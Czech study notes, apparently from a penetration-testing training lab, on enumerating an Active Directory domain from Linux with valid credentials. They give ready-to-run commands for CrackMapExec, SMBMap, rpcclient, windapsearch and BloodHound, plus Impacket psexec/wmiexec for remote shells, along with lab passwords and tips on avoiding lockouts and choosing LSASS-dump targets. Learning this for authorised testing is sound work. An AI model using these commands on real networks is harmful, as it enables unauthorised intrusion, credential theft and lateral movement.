# enumerace AD z Linuxu (Credentialed Enumeration)

Po získání prvotního přístupu (Foothold) a validních doménových údajů je klíčové provést hloubkový průzkum sítě. Většina pokročilých nástrojů pro Active Directory vyžaduje **minimálně nízko-privilegovaný doménový účet**.

### 🔑 Výchozí údaje pro lab:

- **Doména:** `INLANEFREIGHT.LOCAL`
    
- **Target (DC):** `172.16.5.5` (`ACADEMY-EA-DC01`)
    
- **Uživatel:** `forend`
    
- **Heslo:** `Klmcargo2`
    

## 🛠️ 1. NetExec / CrackMapExec (CME)

CME/NetExec je modulární nástroj kombinující funkce Impacketu a PowerSploitu. Využívá se pro plošný i cílený průzkum přes různé protokoly (SMB, LDAP, WinRM).

### A) Průzkum uživatelů a skupin (SMB)

Bash

```
# Výpis všech uživatelů v doméně
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Výpis všech doménových skupin a počtu jejich členů
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

> 📌 **OPSEC Tip:** Výpis uživatelů přes CME zobrazuje i atribut `badpwdcount`. Při plánování password spraye je bezpečné vyfiltrovat uživatele, kteří mají toto číslo vyšší než 0, aby nedošlo k uzamčení jejich účtu.
> 
> 📌 **Cíle zájmu:** Všímej si skupin jako _Domain Admins_, _Administrators_, _Executives_ nebo skupin IT správy.

### B) Lov na uživatelské relace (Session Hunting)

Bash

```
# Ověření aktivně přihlášených uživatelů na konkrétním stroji (např. souborový server)
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

- **Příznak `(Pwn3d!)`:** Pokud se objeví u tvých přihlašovacích údajů, znamená to, že daný uživatel má na cílovém stroji práva **lokálního administrátora**.
    
- Pokud na takovém stroji vidíš přihlášeného Domain Admina (např. `svc_qualys`), tento stroj je ideálním cílem pro lateral movement a pokus o dump přihlašovacích údajů z paměti LSASS.
    

### C) Analýza sdílených složek (Shares & Spidering)

Bash

```
# Rychlý přehled dostupných sdílených složek a našich oprávnění (READ/WRITE)
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Automatický rekurzivní průzkum (spidering) čitelných sdílených složek
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

- Modul `spider_plus` vygeneruje přehledný JSON soubor do `/tmp/cme_spider_plus/<IP>.json`.
    
- **Co hledat v JSONu:** Vyhledávej konfigurační soubory (`web.config`), dávkové soubory (`.bat`, `.ps1`), které mohou obsahovat hardkódovaná hesla.
    

## 🗺️ 2. SMBMap

Skvělý jednoúčelový nástroj pro rychlou kontrolu oprávnění ke sdíleným složkám a jejich rekurzivní procházení.

Bash

```
# Základní přehled přístupu
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# Rekurzivní výpis pouze adresářové struktury (bez zobrazení jednotlivých souborů)
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## 📞 3. rpcclient (MS-RPC)

Nástroj ze sady Samba umožňující provádět nízkoúrovňové dotazy na objekty v AD přes RPC.

Bash

```
# Vytvoření ověřené relace (lze použít i prázdné uvozovky pro NULL session, pokud je povolena)
rpcclient -U "forend%Klmcargo2" 172.16.5.5
```

### Užitečné příkazy uvnitř rpcclient promptu:

- `enumdomusers` – Vypíše všechny uživatele a jejich **RID** (Relative Identifier v hexadecimálním formátu).
    
- `queryuser <RID>` – Zobrazí detailní informace o uživateli (např. `queryuser 0x457`). Můžeš zde zjistit stav účtu, čas poslední změny hesla nebo počet špatně zadaných hesel.
    

> 💡 **Pamatuj si:** Vestavěný lokální/doménový účet `Administrator` má vždy pevně dané **RID 500** (`0x1f4`).

## 🐍 4. Windapsearch

Python skript specializovaný na rychlé a efektivní LDAP dotazy vůči doménovému kontroleru.

Bash

```
# Vyhledání všech přímých členů skupiny Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Rekurzivní vyhledávání privilegovaných uživatelů (-PU)
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

- **Výhoda `-PU`:** Provádí rekurzivní kontrolu vnořených skupin (_nested groups_). Dokáže odhalit uživatele, kteří mají vysoká práva nepřímo (jsou členem skupiny, která je členem jiné administrátorské skupiny).
    

## 🩸 5. BloodHound (Oblast grafické analýzy)

Nejefektivnější nástroj pro mapování vztahů, oprávnění (ACL), skupin a přístupů v AD pomocí teorie grafů.

### Krok 1: Sběr dat (Ingestor) z Linuxu

Pokud nemáš přístup k Windows stroji, odkud bys spustil SharpHound, použij pythonovou alternativu:

Bash

```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

- Příkaz vygeneruje JSON soubory (uživatelé, skupiny, počítače, domény, vztahy).
    

### Krok 2: Spuštění databáze a GUI

Bash

```
# Spuštění grafové databáze Neo4j
sudo neo4j start

# Spuštění samotného BloodHound GUI (ideální přes GUI/RDP prostředí)
bloodhound
```

- _Defaultní přihlášení do Neo4j (pokud je vyžadováno):_ `neo4j` / `HTB_@cademy_stdnt!`.
    

### Krok 3: Analýza

1. Zabal všechny vygenerované `.json` soubory do jednoho ZIP archivu (`zip -r data_bh.zip *.json`).
    
2. Přetáhni ZIP soubor myší do okna BloodHoundu (nebo použij tlačítko **Upload Data**).
    
3. V záložce **Analysis** vyber předpřipravený dotaz: **"Find Shortest Paths To Domain Admins"**.
    
4. BloodHound ti vizuálně vykreslí nejkratší možnou cestu, jak se z aktuálního nízko-privilegovaného účtu propracovat k právům Domain Admina.
    

## 🚀 6. Impacket (Vzdálená exekuce / Lateral Movement)

Pokud zjistíš, že tvůj účet (nebo nově získaný účet útokem crackování hashe) má na nějakém stroji administrátorská práva, Impacket nabízí nástroje pro získání shellu.

### A) psexec.py

Bash

```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

- **Jak funguje:** Nahraje náhodně pojmenovanou binárku do sdílené složky `ADMIN$`, zaregistruje ji jako Windows službu a spustí ji.
    
- **Výsledek:** Poskytne plnohodnotný interaktivní shell s nejvyššími právy **`NT AUTHORITY\SYSTEM`**.
    
- _Nevýhoda:_ Velmi hlučný (noisy) proces, moderní EDR/antiviry ho okamžitě blokují.
    

### B) wmiexec.py

Bash

```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

- **Jak funguje:** Využívá rozhraní WMI (Windows Management Instrumentation). Nenahrává na disk žádné soubory.
    
- **Výsledek:** Semi-interaktivní shell běžící pod kontextem daného uživatele (nikoliv SYSTEM).
    
- _Výhoda:_ O něco tišší než psexec.py.
    
- _Nevýhoda:_ Každý příkaz generuje nový proces `cmd.exe` (Event ID 4688 v logách Windows), což je snadno dohledatelné při forenzní analýze.